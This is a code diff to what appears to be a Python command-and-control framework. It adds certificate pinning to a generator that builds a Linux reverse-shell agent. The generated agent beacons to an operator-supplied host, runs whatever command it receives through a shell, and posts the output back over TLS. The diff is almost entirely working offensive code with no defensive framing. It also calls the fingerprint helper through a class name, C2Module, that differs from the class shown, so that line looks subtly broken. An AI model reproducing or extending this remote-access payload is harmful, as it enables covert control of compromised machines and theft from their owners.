@@ -4,6 +4,7 @@ HTTP/HTTPS listener, payload generation, session management,
 DNS tunneling, and encrypted reverse shell handling.
 """
 
+import hashlib
 import http.server
 import json
 import os
@@ -220,47 +221,101 @@ class C2Framework(BaseModule):
     # ── Payload Generation ──
 
     @staticmethod
+    def _compute_cert_fingerprint(cert_path: str) -> str:
+        """SHA256 fingerprint of the listener's TLS cert (DER-encoded), hex."""
+        with open(cert_path, "rb") as f:
+            pem_data = f.read()
+        der_data = ssl.PEM_cert_to_DER_cert(pem_data.decode())
+        return hashlib.sha256(der_data).hexdigest()
+
+    @staticmethod
     def generate_payload(lhost: str, lport: int,
                          payload_type: str = "reverse_shell",
                          platform: str = "linux",
+                         cert_path: Optional[str] = None,
                          on_output: Optional[Callable] = None) -> str:
-        """Generate agent payloads for different platforms."""
+        """Generate agent payloads with cert-pinning for MITM resistance.
+
+        cert_path: path to the C2 listener's PEM cert. Defaults to
+                   /etc/shadowcypher/ghost/cert.pem (managed by postinst).
+        Raises RuntimeError if the cert doesn't exist — refuses to emit
+        a payload that trusts any TLS peer.
+        """
         if not validate_ip(lhost) or not validate_port(lport):
             return ""
 
+        if cert_path is None:
+            cert_path = os.environ.get(
+                "SHADOWCYPHER_C2_CERT", "/etc/shadowcypher/ghost/cert.pem"
+            )
+        if not os.path.exists(cert_path):
+            raise RuntimeError(
+                f"C2_CERT_MISSING: cannot generate payload without pinned cert at {cert_path}. "
+                "Start the Ghost listener first (it auto-generates the cert) or set SHADOWCYPHER_C2_CERT."
+            )
+        fingerprint = C2Module._compute_cert_fingerprint(cert_path)
+
         if payload_type == "reverse_shell" and platform == "linux":
             payload = f'''#!/usr/bin/env python3
-import json, os, platform, socket, subprocess, time, urllib.request, ssl
+import hashlib, json, platform, socket, ssl, subprocess, time, urllib.parse
 
-C2_URL = "https://{lhost}:{lport}"
+C2_HOST = "{lhost}"
+C2_PORT = {lport}
+PINNED_SHA256 = "{fingerprint}"
 BEACON_INTERVAL = 5
 
-def beacon():
-    hostname = platform.node()
-    os_type = platform.system()
-    ctx = ssl.create_default_context()
+def _verified_socket():
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
+    raw = socket.create_connection((C2_HOST, C2_PORT), timeout=10)
+    sock = ctx.wrap_socket(raw, server_hostname=C2_HOST)
+    der = sock.getpeercert(binary_form=True)
+    if not der or hashlib.sha256(der).hexdigest() != PINNED_SHA256:
+        try: sock.close()
+        except Exception: pass
+        raise RuntimeError("cert pin mismatch")
+    return sock
+
+def _http(method, path, body=b""):
+    sock = _verified_socket()
+    try:
+        lines = [
+            f"{{method}} {{path}} HTTP/1.1",
+            f"Host: {{C2_HOST}}:{{C2_PORT}}",
+            "User-Agent: Mozilla/5.0",
+            "Connection: close",
+            "Content-Type: application/json",
+            f"Content-Length: {{len(body)}}",
+            "", "",
+        ]
+        sock.sendall("\\r\\n".join(lines).encode() + body)
+        buf = b""
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk: break
+            buf += chunk
+        head, _, body_bytes = buf.partition(b"\\r\\n\\r\\n")
+        return body_bytes
+    finally:
+        try: sock.close()
+        except Exception: pass
+
+def beacon():
+    hostname = urllib.parse.quote(platform.node())
+    os_type = urllib.parse.quote(platform.system())
     while True:
         try:
-            req = urllib.request.Request(
-                f"{{C2_URL}}/beacon?h={{hostname}}&os={{os_type}}",
-                headers={{"User-Agent": "Mozilla/5.0"}},
-            )
-            resp = urllib.request.urlopen(req, context=ctx, timeout=10)
-            data = json.loads(resp.read())
+            resp = _http("GET", f"/beacon?h={{hostname}}&os={{os_type}}")
+            data = json.loads(resp or b"{{}}")
             cmd = data.get("cmd", "")
-            if cmd and cmd != "exit":
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-                output = result.stdout + result.stderr
-                post_data = json.dumps({{"output": output, "cmd": cmd}}).encode()
-                req2 = urllib.request.Request(
-                    f"{{C2_URL}}/result", data=post_data,
-                    headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}},
-                )
-                urllib.request.urlopen(req2, context=ctx, timeout=10)
-            elif cmd == "exit":
+            if cmd == "exit":
                 break
+            if cmd:
+                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+                out = (proc.stdout or "") + (proc.stderr or "")
+                body = json.dumps({{"output": out, "cmd": cmd}}).encode()
+                _http("POST", "/result", body)
         except Exception:
             pass
         time.sleep(BEACON_INTERVAL)
